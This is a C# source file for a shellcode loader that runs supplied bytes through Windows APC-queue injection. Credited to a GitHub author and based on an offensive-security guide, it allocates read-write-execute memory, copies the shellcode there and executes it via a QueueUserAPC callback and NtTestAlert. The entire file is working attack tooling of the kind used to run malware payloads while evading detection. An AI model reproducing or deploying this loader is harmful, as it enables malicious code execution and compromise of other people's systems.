using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using static ShellCodeLoader.Shared;
/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Please let this credit for all the time I worked on ||
|| Guide & Inspirations : https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection
*/
namespace ShellCodeLoader
{
    public class QueueAPC : IDisposable
    {

        private byte[] ShellCode;
        private uint RegionSize;
        private Process Target;
        private bool NewThread;

        public QueueAPC(byte[] shellCode, bool newThread = false)
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.Target = Process.GetCurrentProcess();
            this.NewThread = newThread;
        }
        private unsafe void CallBackQueueUserAPC(void* param) 
        {
            IntPtr ptr = Imports.VirtualAllocEx(Target.Handle, IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, Shared.PageProtection.PAGE_EXECUTE_READWRITE);
            
            UIntPtr writtenBytes;
            Imports.WriteProcessMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
           
            PageProtection flOld;
            Imports.VirtualProtect(ptr, RegionSize, PageProtection.PAGE_EXECUTE_READWRITE, out flOld);
            
            ShellCodeCaller s = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
            s();
        }

        private unsafe void QueueUserAPC() 
        {
            if (NewThread)
            {
                new Thread(() =>
                {
                    //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
                    Imports.CallBack s = new Imports.CallBack(CallBackQueueUserAPC);   //set our callback for APC (the callback is a classic shellcode loader
                    
                    Imports.QueueUserAPC(s, Imports.GetCurrentThread(), IntPtr.Zero);  //add apc to our thread     
                    
                    //Imports.SleepEx(0, true);                                        //now we have to set an alertable for our thread : https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
                    Imports.NtTestAlert();                                             //empty APC queue for the current thread
                
                }).Start();                                                             
            }
            else 
            {
                //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
                Imports.CallBack s = new Imports.CallBack(CallBackQueueUserAPC);   //set our callback for APC (the callback is a classic shellcode loader
               
                Imports.QueueUserAPC(s, Imports.GetCurrentThread(), IntPtr.Zero);  //add apc to our thread     
               
                //Imports.SleepEx(0, true);                                        //now we have to set an alertable for our thread : https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
                Imports.NtTestAlert();                                             //empty APC queue for the current thread
            }
        }

        public void LoadWithQueueAPC() 
        {
            QueueUserAPC();
        }

        private static class Imports
        {
            internal const String KERNEL32 = "kernel32.dll";
            internal const String NTDLL = "ntdll.dll";


            public unsafe delegate void CallBack(void* param);
            public delegate void ShellCodeCaller();


            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static unsafe extern uint QueueUserAPC(CallBack pFunction, IntPtr tHandle, IntPtr dwData);
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static unsafe extern uint SleepEx(uint dwMilliseconds, bool bAlertable);
            [DllImport(NTDLL, SetLastError = true)]
            public static extern uint NtTestAlert();


            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr address, IntPtr numBytes, Shared.TypeAlloc commitOrReserve, Shared.PageProtection pageProtectionMode);
            
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, Shared.PageProtection flNewProtect, out Shared.PageProtection lpflOldProtect);
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr GetCurrentThread();
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
